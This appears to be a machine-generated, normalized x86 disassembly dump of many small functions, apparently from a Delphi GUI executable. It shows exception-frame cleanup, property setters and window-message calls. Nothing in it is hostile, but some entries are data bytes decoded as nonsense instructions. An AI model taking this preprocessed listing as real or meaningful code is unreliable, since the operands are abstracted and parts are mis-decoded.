sub_44c328
retn
sub_44c32c
retn
sub_44c330
retn
sub_44c334
retn
sub_44c5e0
jmp sub_403a3c
sub_44c97c
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032b8
mov [ ebx + 0x90 ] eax
sub_44c9a4
push esi
mov si 0xffef
call sub_4034e4
pop esi
retn
sub_44ca45
jmp sub_403a3c
sub_44ca4c
pop ebp
retn
sub_44ca50
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_416df8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_416df8
sub_44cbf0
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_44cd75
jmp sub_403a3c
sub_44cd7c
pop ebx
pop ecx
pop ebp
retn
sub_44cd80
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_44cd88
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_44cf58
sub_44ce35
jmp sub_403a3c
sub_44ce3c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_4032e8
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_44cfeb
jmp sub_403a3c
sub_44cff2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44d08a
jmp sub_403a3c
sub_44d091
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d0ae
mov eax [ ebp - 0xc ]
call sub_4032e8
retn
sub_44d0a7
jmp sub_403a3c
sub_44d0ae
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4034e4
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d167
jmp sub_403a3c
sub_44d16e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44d174
or edx 0xffffffff
call sub_44d0e8
retn
sub_44d583
jmp sub_403a3c
sub_44d58a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d5a7
mov eax [ ebp - 0xc ]
call sub_4032e8
retn
sub_44d5a0
jmp sub_403a3c
sub_44d5a7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d5c4
mov eax [ ebp - 0x4 ]
call sub_44e0bc
retn
sub_44d5bd
jmp sub_403a3c
sub_44d5c4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d7c8
jmp sub_403a3c
sub_44d7cf
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44d7d4
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_4034e4
sub_44d7ec
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_416114
pop ebx
retn
sub_44d890
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_417414
sub_44d9a7
jmp sub_403a3c
sub_44d9ae
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4032e8
retn
sub_44d9c4
jmp sub_403a3c
sub_44dcd6
jmp sub_403a3c
sub_44dcdd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dcfa
mov eax [ ebp - 0x10 ]
call sub_4032e8
retn
sub_44dcf3
jmp sub_403a3c
sub_44dcfa
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dd17
mov eax [ ebp - 0x8 ]
call sub_4032e8
retn
sub_44dd10
jmp sub_403a3c
sub_44dd17
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44dd80
jmp sub_403a3c
sub_44de99
jmp sub_403a3c
sub_44deb6
jmp sub_403a3c
sub_44e06e
jmp sub_403a3c
sub_44e075
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44e0b8
inc [ eax + 0x5c ]
retn
sub_44e0bc
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_4034e4
sub_44e110
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_44e14d
jmp sub_403a3c
sub_44e154
pop ebp
retn
sub_44e158
sub [ rw-data ] 0x1
retn
sub_44e4ba
inc esp
add [ ecx + edi * 8 ] dl
inc esp
add [ eax ] ah
retn
sub_44ea08
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
0x44 0x0
sub_44f0c0
mov eax [ esp + 0x8 ]
retn
sub_44f0c8
push ebx
mov ebx eax
call sub_44f0c0
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
jmp sub_403a74
sub_44f0e4
pop ebx
retn
sub_44f35d
jmp sub_403a3c
sub_44f364
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44f4af
jmp sub_403a3c
sub_44f4b6
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44f4cc
push ebx
mov eax [ rw-data ]
call sub_417a70
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_417a44
mov eax ebx
pop ebx
retn
sub_44f654
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403498
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_44f670
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403498
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_44fd6b
jmp sub_403a3c
sub_44fd72
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44fe6a
jmp sub_403a3c
sub_44fe71
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_450294
jmp sub_403a3c
sub_45029b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_450747
jmp sub_403a3c
sub_450be8
jmp sub_403a3c
sub_450bef
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_451053
jmp sub_403a3c
sub_451510
jmp sub_403a3c
sub_451517
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4518c2
jmp sub_403a3c
sub_4518c9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4518d7
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_451a84
mov eax [ r-xdata ]
retn
sub_451ac0
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_451ad4
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_451ae4
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_451af4
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_451df0
mov edx eax
sub_451b8c
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403498
mov edx esi
call sub_451b0c
pop esi
pop ebx
retn
sub_451c08
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_451df0
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_4175cc
mov ecx eax
sub_451fe0
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_452048
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_4523f0
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_452424
sub_452424
mov edx sub_4523fc
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_44f54c
retn
sub_45260e
jmp sub_403a3c
sub_452615
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452aac
jmp sub_403a3c
sub_452aeb
jmp sub_403a3c
sub_452af2
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452c90
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_452dcc
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_4034e4
pop esi
pop ebp
retn 0x8
sub_452de8
mov eax [ eax + 0x34 ]
call sub_450020
retn
sub_452df4
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_4034e4
pop esi
retn
sub_452e30
push ebx
mov ecx sub_452e08
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_44f54c
pop ebx
retn
sub_453064
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_453078
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
sub_4531ad
jmp sub_403788
sub_4532af
jmp sub_403a3c
sub_4532da
jmp sub_403a3c
sub_4532e1
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_4532f8
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_4534e0
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_452e30
sub_453560
jmp sub_403a3c
sub_4535a4
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_4535bc
push ebx
mov ebx eax
mov eax ebx
call sub_41d4e8
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_45360e
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_452e30
sub_453684
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4537cd
jmp sub_403a3c
sub_4537d4
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_453a14
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_453a24
sub_453a78
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_453a88
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_453a98
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_453aa8
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_453ab8
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_453b30
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_44fe78
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_44fe78
retn
sub_453b4c
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_44fe78
sub_453b94
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_452de8
retn
mov eax edx
retn
sub_453d9c
mov [ eax + 0x58 ] edx
call sub_453b68
retn
sub_453dd2
jmp sub_403788
sub_453dd7
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45f9a8
call sub_403af0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45413d
jmp sub_403a3c
sub_454144
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_4032e8
retn
sub_45415a
jmp sub_403a3c
sub_45425b
jmp sub_403a3c
sub_454262
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45427f
mov eax [ ebp - 0x14 ]
call sub_4032e8
retn
sub_454278
jmp sub_403a3c
sub_45429d
jmp sub_403a3c
sub_454327
jmp sub_403a3c
sub_45432e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_454360
push ebx
mov ebx eax
mov eax ebx
call sub_4176b4
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_41e298
sub_454424
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_454438
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_454440
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_454805
jmp sub_403a3c
sub_45480c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45490c
jmp sub_403a3c
sub_454913
pop ebp
retn
sub_45548b
[ edi + edi * 8 - 0x2f002f ]
sub_455492
stc
jmp esp
sub_456754
mov eax [ rw-data ]
retn
sub_45675c
mov [ rw-data ] eax
retn
sub_4568a4
jmp sub_403788
sub_4568db
jmp sub_403a3c
sub_4568e2
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456ab0
call sub_41e1c0
retn
sub_456bf2
jmp sub_403a3c
sub_456bf9
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_456c9d
jmp sub_403a3c
sub_456ca4
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456d34
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_457460
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_457b0c
sub_45747c
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_457460
sub_45759c
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_457b0c
sub_4575b4
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_457b0c
sub_4575cc
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_457b0c
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_4575f8
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_457604
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_457b0c
retn
sub_4578e4
push ebx
mov ebx edx
mov edx ebx
call sub_443324
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_457954
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_457a7c
jmp sub_403a3c
sub_457a83
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457a8c
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_456e98
mov eax [ ebx + 0x20c ]
call sub_456e98
sub_457aec
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_457afc
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_457bf7
jmp sub_403a3c
sub_457c04
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_457c1c
sub_457e38
retn
sub_457ea6
jmp sub_403a3c
sub_457ee5
jmp sub_403a3c
sub_457f18
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_44481c
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_457124
retn
sub_457f3c
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_44483c
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_457124
retn
sub_458031
jmp sub_403a3c
sub_458038
mov eax [ ebp - 0x4 ]
call sub_4467d4
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_456d8c
mov eax [ ebp - 0x4 ]
call sub_457b0c
sub_45816c
jmp sub_403a3c
sub_4581a4
jmp sub_403a3c
sub_4581ab
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4581cb
lea eax [ ebp - 0x114 ]
call sub_404038
retn
sub_4581c4
jmp sub_403a3c
sub_4581cb
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4584d2
jmp sub_403a3c
sub_4584d9
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40365c
j_sub_403788#9
jmp sub_403788
sub_4585a9
jmp sub_403788
sub_4585ae
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45f9a8
call sub_403af0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_458966
jmp sub_403a3c
sub_45896d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_458a48
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41b478
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_458a60
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_458a98
mov edx eax
mov eax esi
call sub_41cd00
pop esi
pop ebx
retn
sub_458a7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_459e3c
mov edx eax
mov eax esi
call sub_41cd00
pop esi
pop ebx
retn
sub_458a98
push ebx
mov ebx eax
mov eax ebx
call sub_459adc
mov edx r-xdata
call sub_4212e8
pop ebx
retn
sub_458b9c
push ebx
mov ebx eax
mov eax ebx
call sub_458bac
xor al 0x1
pop ebx
retn
sub_458bac
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_458c08
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_458c28
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_458c48
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_458f41
jmp sub_403a3c
sub_458f48
pop ecx
pop ebp
retn
sub_458f4c
xor eax eax
retn
sub_459224
jmp sub_403a3c
sub_45922b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4032e8
retn
sub_459241
jmp sub_403a3c
sub_45932b
jmp sub_403a3c
sub_459332
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45934f
mov eax [ ebp - 0xc ]
call sub_4032e8
retn
sub_459348
jmp sub_403a3c
sub_45936f
jmp sub_403a3c
sub_45965a
jmp sub_403a3c
sub_4597ed
jmp sub_403a3c
sub_459adc
mov eax [ eax + 0x238 ]
retn
sub_459ae4
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_459af0
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_459e2e
jmp sub_403a3c
sub_459e35
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_459e3c
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_459e84
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_443a38
sub_459ea0
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_459edc
push ebx
mov ebx eax
mov eax ebx
call sub_4459cc
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_420c38
sub_459f60
push ebx
mov ebx eax
mov eax ebx
call sub_4459f4
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_42138c
sub_459f80
push ebx
mov ebx eax
mov eax ebx
call sub_459ba0
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_459c68
pop ebx
retn
sub_45a7ad
lea eax [ ebp - 0xb4 ]
call sub_404038
retn
sub_45a7b9
jmp sub_403a3c
j_sub_45a7ad
jmp sub_45a7ad
sub_45a7c0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45a918
jmp sub_403a3c
sub_45a91f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45ac04
jmp sub_403a3c
sub_45ac0b
mov eax [ rw-data ]
call sub_45d4bc
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45ac22
add [ eax ] al
retn
sub_45ae80
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_45aea0
mov eax [ eax + 0x240 ]
call sub_4271b4
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_45f25c
sub_45af47
jmp sub_403a3c
sub_45af4e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45af71
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_421364
retn
sub_45af6a
jmp sub_403a3c
sub_45af71
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b130
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45aea0
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_45b398
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_452f9c
sub_45b483
jmp sub_403a3c
sub_45b48a
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b490
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_45ac78
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_45b4e8
call sub_45c210
retn
sub_45b935
jmp sub_403a3c
sub_45b93c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45bc38
jmp sub_403788
sub_45bfd4
jmp sub_403788
sub_45c0cd
jmp sub_403a3c
sub_45c0d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c0f1
lea eax [ ebp - 0x8 ]
call sub_404038
retn
sub_45c0ea
jmp sub_403a3c
sub_45c0f1
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45c0f8
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_4271b4
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_458b40
sub_45c118
call sub_4032e8
retn
sub_45c170
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_45c1d6
jmp sub_403a3c
sub_45c384
jmp sub_403788
sub_45c3b0
xor edx edx
call sub_458ea4
retn
sub_45c3b8
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_458ea4
mov eax ebx
call sub_43ff10
pop ebx
retn
sub_45c43e
jmp sub_403a3c
sub_45c445
pop ebx
pop ecx
pop ebp
retn
sub_45c44c
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_4464d0
push eax
call PostMessageA
pop ebx
retn
sub_45c650
jmp sub_403a3c
sub_45c6f1
jmp sub_403a3c
sub_45c6fb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c71a
mov eax [ rw-data ]
call sub_45e934
retn
sub_45c713
jmp sub_403a3c
sub_45c71a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c737
lea eax [ ebp - 0x20 ]
call sub_404038
retn
sub_45c730
jmp sub_403a3c
sub_45c737
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45c818
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_43f0bc
retn
mov edx eax
mov eax [ rw-data ]
call sub_45df88
retn
sub_45cb9c
mov edx eax
mov eax [ rw-data ]
call sub_45f9a8
mov al 0x1
retn
sub_45cc84
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_45cbac
sub_45cc98
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_45cbac
sub_45ccac
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_45cbac
sub_45ccc0
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_45cbac
sub_45ccd4
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_45ce3f
jmp sub_403a3c
sub_45ce46
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ce4c
push ebx
mov ebx eax
mov eax ebx
call sub_444db0
mov eax ebx
call sub_444f34
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45c44c
sub_45d0c2
jmp sub_403a3c
sub_45d0c9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45d0d0
push ebx
mov ebx edx
mov edx ebx
call sub_445218
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_43f1c4
pop ebx
retn
sub_45d124
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45d18c
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_45d13c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45d18c
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_45d158
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45d18c
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_45d170
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
